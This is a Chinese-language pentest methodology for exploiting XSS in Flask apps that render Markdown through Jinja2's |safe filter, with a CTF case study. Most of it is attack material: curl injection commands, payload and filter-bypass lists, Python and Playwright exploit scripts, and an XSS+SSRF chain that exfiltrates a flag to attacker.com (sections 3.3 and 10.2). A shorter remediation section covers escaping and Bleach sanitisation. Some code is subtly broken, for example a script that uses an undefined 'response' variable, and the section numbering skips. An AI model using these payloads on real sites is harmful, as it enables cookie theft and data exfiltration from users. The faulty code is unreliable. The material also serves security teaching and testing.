# Jinja2 Safe 过滤器 XSS 攻击

## 1. 方法论概述

### 1.1 编写目的
本方法论指导渗透测试人员识别和利用 Jinja2 模板引擎中 `|safe` 过滤器滥用导致的跨站脚本（XSS）漏洞。

### 1.2 适用范围
- 使用 Jinja2 模板引擎的 Flask/Django 应用
- 模板中使用 `|safe` 过滤器渲染用户输入
- Markdown 转 HTML 后直接渲染
- 无 HTML  sanitization 机制

### 1.3 读者对象
- 渗透测试工程师
- Python/Flask 安全研究人员
- 代码审计人员

---

## 2. 技术原理

### 2.1 Jinja2 自动转义机制

**默认行为：**
```jinja2
{{ user_input }}        {# 自动 HTML 实体编码 #}
{{ user_input|safe }}   {# 禁用自动编码 - 危险！#}
```

**自动编码示例：**
```
输入：<script>alert(1)</script>

默认输出：&lt;script&gt;alert(1)&lt;/script&gt;  {# 安全 #}
|safe 输出：<script>alert(1)</script>            {# 危险！#}
```

### 2.2 Markdown 与 XSS

**Python Markdown 行为：**
```python
import markdown

# 默认配置保留原始 HTML
content = "<script>alert(1)</script>"
html = markdown.markdown(content)
# 输出：<script>alert(1)</script>  (未过滤)
```

**危险代码模式：**
```python
# ❌ 危险代码
@app.route('/convert', methods=['POST'])
def convert():
    markdown_text = request.form.get('markdown_text')
    html_content = markdown.markdown(markdown_text)  # 保留 HTML
    return render_template('converter.html', html_content=html_content)
```

```jinja2
{# ❌ 危险模板 #}
<div class="output">
    {{ html_content|safe }}  {# 禁用转义 - XSS！#}
</div>
```

### 2.3 漏洞组合

**完整攻击链：**
```
用户输入 Markdown
    ↓
markdown.markdown()  {# 保留原始 HTML #}
    ↓
{{ html_content|safe }}  {# 禁用 Jinja2 转义 #}
    ↓
浏览器执行 JavaScript  {# XSS！#}
```

---

## 3. 攻击场景

### 3.1 场景 1：直接 Markdown 注入

**目标：** 通过 markdown_text 参数注入 XSS

**攻击步骤：**

1. **识别注入点**
   ```bash
   # 查找 Markdown 转换功能
   POST /convert
   Content-Type: application/x-www-form-urlencoded
   
   markdown_text=Test content
   ```

2. **测试基础 XSS**
   ```bash
   curl -X POST http://target/convert \
     -d "markdown_text=<script>alert('XSS')</script>"
   ```

3. **验证响应**
   ```html
   <!-- 检查响应中是否包含未编码的 script 标签 -->
   <div class="output">
       <script>alert('XSS')</script>
   </div>
   ```

### 3.2 场景 2：事件处理器注入

**Payload 示例：**
```html
<!-- 图片加载错误 -->
<img src=x onerror=alert('XSS')>

<!-- SVG  onload -->
<svg onload=alert('XSS')>

<!-- 鼠标事件 -->
<div onmouseover=alert('XSS')>Hover me</div>

<!-- 自动聚焦 -->
<input autofocus onfocus=alert('XSS')>
```

**完整攻击：**
```bash
curl -X POST http://localhost:42369/convert \
  -d "markdown_text=<img src=x onerror=alert('XSS-VULN-01-CONFIRMED')>"
```

### 3.3 场景 4：XSS + SSRF 链式攻击

**目标：** 结合 XSS 和 SSRF 提取 Flag

**攻击 Payload：**
```html
<script>
// 使用 SSRF 访问内部端点
fetch('/convert', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'url=http://127.0.0.1/admin/flag'
})
.then(r => r.text())
.then(html => {
  // 提取 Flag 并显示
  const flag = html.match(/flag\{[^}]+\}/)[0];
  document.body.innerHTML = '<h1>FLAG: ' + flag + '</h1>';
  
  // 或外带到攻击者服务器
  fetch('https://attacker.com/exfil?flag=' + flag);
});
</script>
```

**攻击流程：**
```
受害者访问恶意页面
    ↓
XSS Payload 执行
    ↓
JavaScript 发起 SSRF 请求
    ↓
POST /convert?url=http://127.0.0.1/admin/flag
    ↓
服务器返回 Flag
    ↓
JavaScript 提取并外带 Flag
```

---

## 4. 探测与验证

### 4.1 黑盒测试

**步骤 1：识别 Jinja2 应用**
```bash
# 检查响应头
curl -I http://target/

# 查找 Werkzeug/Flask 标识
Server: Werkzeug/3.0.6 Python/3.8.20
```

**步骤 2：测试 XSS**
```bash
# 基础测试
curl -X POST http://target/convert \
  -d "markdown_text=<img src=x onerror=alert(1)>"

# 检查响应
curl -X POST http://target/convert \
  -d "markdown_text=<img src=x onerror=alert(1)>" | grep -o "<img.*>"
```

**步骤 3：浏览器验证**
```python
# 使用 Playwright 验证
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch()
    page = browser.new_page()
    
    # 导航到页面
    page.goto('http://localhost:42369/')
    
    # 注入 XSS Payload
    page.fill('textarea[name="markdown_text"]', 
              '<img src=x onerror=alert("XSS-CONFIRMED")>')
    page.click('button[type="submit"]')
    
    # 等待 alert
    page.on('dialog', lambda dialog: print(f'Alert: {dialog.message}'))
    
    browser.close()
```

### 4.2 白盒测试

**代码审计检查点：**

```python
# 查找 |safe 过滤器使用
grep -rn "|safe" templates/

# 查找 markdown 渲染
grep -rn "markdown.markdown" .

# 查找模板渲染
grep -rn "render_template" .
```

**危险模式：**
```jinja2
{# ❌ 危险模式 #}
{{ user_input|safe }}
{{ html_content|safe }}
{{ content|safe }}

{# ✅ 安全模式 #}
{{ user_input }}  {# 自动转义 #}
{{ user_input|e }}  {# 显式转义 #}
```

```python
# ❌ 危险代码
html_content = markdown.markdown(user_input)
return render_template('page.html', html_content=html_content)
```

```jinja2
{# 对应危险模板 #}
<div>{{ html_content|safe }}</div>
```

---

## 5. 利用方法

### 5.1 基础利用命令

**单命令利用：**
```bash
curl -X POST http://localhost:42369/convert \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "markdown_text=<script>alert('XSS')</script>"
```

### 5.2 自动化利用脚本

**Python 脚本：**
```python
#!/usr/bin/env python3
"""
Jinja2 Safe Filter XSS Exploitation
利用 Jinja2 |safe 过滤器进行 XSS 攻击
"""

import requests

TARGET = "http://localhost:42369"
CONVERT_ENDPOINT = "/convert"

# XSS Payload 列表
PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'>",
    "<a href='javascript:alert(\"XSS\")'>Click</a>",
]

def test_xss(payload):
    """测试 XSS Payload"""
    response = requests.post(
        f"{TARGET}{CONVERT_ENDPOINT}",
        data={"markdown_text": payload}
    )
    
    # 检查 Payload 是否在响应中未编码
    if payload in response.text or payload.replace(' ', '') in response.text:
        return True
    return False

def main():
    print("[*] Testing XSS Payloads...")
    
    for payload in PAYLOADS:
        if test_xss(payload):
            print(f"[+] Vulnerable! Payload: {payload}")
            print(f"[*] Full response:\n{response.text[:500]}")
            break
    else:
        print("[-] No XSS detected")

if __name__ == '__main__':
    main()
```

### 5.3 XSS + SSRF 链式攻击脚本

```python
#!/usr/bin/env python3
"""
XSS + SSRF Chain Attack
结合 XSS 和 SSRF 提取 Flag
"""

from playwright.sync_api import sync_playwright

TARGET = "http://localhost:42369"

# XSS + SSRF Payload
PAYLOAD = """
<script>
fetch('/convert', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'url=http://127.0.0.1/admin/flag'
})
.then(r => r.text())
.then(html => {
  const flagMatch = html.match(/flag\\{[^}]+\\}/);
  if (flagMatch) {
    document.body.innerHTML = '<h1>FLAG EXTRACTED:</h1><pre>' + flagMatch[0] + '</pre>';
  }
});
</script>
"""

def main():
    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page()
        
        # 导航到目标
        page.goto(TARGET)
        
        # 注入 Payload
        page.fill('textarea[name="markdown_text"]', PAYLOAD)
        page.click('button[type="submit"]')
        
        # 等待 Flag 显示
        page.wait_for_selector('pre', timeout=5000)
        
        # 提取 Flag
        flag = page.query_selector('pre').inner_text()
        print(f"[+] Flag: {flag}")
        
        browser.close()

if __name__ == '__main__':
    main()
```

---

## 6. 绕过技巧

### 6.1 绕过标签过滤

**当 `<script>` 被过滤时：**
```html
<!-- 使用 img + onerror -->
<img src=x onerror=alert(1)>

<!-- 使用 svg + onload -->
<svg onload=alert(1)>

<!-- 使用 body + onload -->
<body onload=alert(1)>

<!-- 使用 input + autofocus -->
<input autofocus onfocus=alert(1)>

<!-- 使用 marquee + onstart -->
<marquee onstart=alert(1)>

<!-- 使用 details + ontoggle -->
<details ontoggle=alert(1) open>
```

### 6.2 绕过事件处理器过滤

**当 onerror/onload 被过滤时：**
```html
<!-- 使用较少见的事件 -->
<img src=x onerror=alert(1)>
<img src=x onmouseover=alert(1)>
<img src=x onmouseenter=alert(1)>

<!-- 使用 CSS 表达式（旧浏览器） -->
<style>
body { background: url('javascript:alert(1)'); }
</style>

<!-- 使用 data URL -->
<iframe src="data:text/html,<script>alert(1)</script>">
```

### 6.3 绕过引号过滤

**当引号被过滤时：**
```html
<!-- 不使用引号 -->
<img src=x onerror=alert(1)>

<!-- 使用反引号 -->
<img src=x onerror=alert(`XSS`)>

<!-- 使用空格代替引号 -->
<img src=x onerror=alert(1) >

<!-- 使用斜杠 -->
<img/src=x onerror=alert(1)>
```

### 6.4 Markdown 特定绕过

**Markdown 语法中的 HTML：**
```markdown
<!-- 直接 HTML -->
<script>alert(1)</script>

<!-- Markdown 链接中的 JavaScript -->
[Click](javascript:alert(1))

<!-- Markdown 图片 XSS -->
![alt](javascript:alert(1))

<!-- 代码块中的 HTML（某些配置） -->
    <script>alert(1)</script>
```

---

## 7. 影响评估

### 7.1 直接危害
- 会话 Cookie 窃取（如果无 HttpOnly）
- 凭证钓鱼
- 恶意重定向
- 键盘记录

### 7.2 潜在危害
- 结合 SSRF 提取内部数据
- 横向移动到内部服务
- 云环境凭证窃取

### 7.3 CVSS 评分参考
- **基础分数：** 8.2 (High)
- **攻击向量：** Network (AV:N)
- **攻击复杂度：** Low (AC:L)
- **权限要求：** None (PR:N)
- **用户交互：** Required (UI:R)
- **机密性影响：** High (C:H)
- **完整性影响：** Low (I:L)
- **可用性影响：** None (A:N)

---

## 8. 修复建议

### 8.1 移除 |safe 过滤器

**❌ 不安全：**
```jinja2
<div class="output">
    {{ html_content|safe }}
</div>
```

**✅ 安全：**
```jinja2
<div class="output">
    {{ html_content }}  {# 自动转义 #}
</div>
```

### 8.2 HTML Sanitization

**使用 Bleach 库：**
```python
import bleach
import markdown

# 安全的 Markdown 渲染
def safe_markdown(content):
    # 先转换为 HTML
    html = markdown.markdown(content)
    
    # 清理危险标签
    clean_html = bleach.clean(
        html,
        tags=[
            'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3',
            'ul', 'ol', 'li', 'blockquote', 'code', 'pre'
        ],
        attributes={},
        strip=True
    )
    
    return clean_html

# 使用
html_content = safe_markdown(markdown_text)
return render_template('page.html', html_content=html_content)
```

### 8.3 模板配置

```jinja2
{# 安全模板 #}
<div class="raw-output">
    <pre>{{ raw_content }}</pre>  {# 无 |safe，自动转义 #}
</div>

<div class="html-output">
    {{ sanitized_html }}  {# 已清理的 HTML #}
</div>
```

---

## 9. 参考资源

- [Jinja2 Security Documentation](https://jinja.palletsprojects.com/en/3.1.x/sandbox/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Bleach Library Documentation](https://bleach.readthedocs.io/)

---

## 10. 实战案例

### 10.1 CTF 挑战案例

**目标：** Flask Markdown 转换器

**漏洞代码：**
```python
# app.py
html_content = markdown.markdown(markdown_text)
return render_template('converter.html', html_content=html_content)
```

```jinja2
{# converter.html #}
<div class="result">
    {{ html_content|safe }}  {# XSS 漏洞 #}
</div>
```

**利用：**
```bash
curl -X POST http://localhost:42369/convert \
  -d "markdown_text=<img src=x onerror=alert('XSS-CONFIRMED')>"
```

**结果：** JavaScript 成功执行

### 10.2 XSS + SSRF 链式攻击

**Payload：**
```html
<script>
fetch('/convert', {
  method: 'POST',
  body: 'url=http://127.0.0.1/admin/flag'
})
.then(r => r.text())
.then(html => {
  fetch('https://attacker.com/exfil?flag=' + 
        encodeURIComponent(html.match(/flag\{[^}]+\}/)[0]));
});
</script>
```

**结果：** Flag 成功外带
